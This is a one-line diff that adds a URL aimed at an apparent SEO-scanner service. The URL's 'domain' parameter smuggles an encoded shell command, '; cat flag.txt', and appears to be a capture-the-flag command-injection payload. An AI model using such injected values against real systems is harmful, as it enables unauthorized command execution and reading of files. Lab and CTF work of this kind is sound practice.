@@ -1,0 +1,1 @@
+http://seoscan.semrush.work:8080/?domain=https%3A%2F%2Fwww.sethserver.com%2F+-f+html%3B+cat+flag.txt
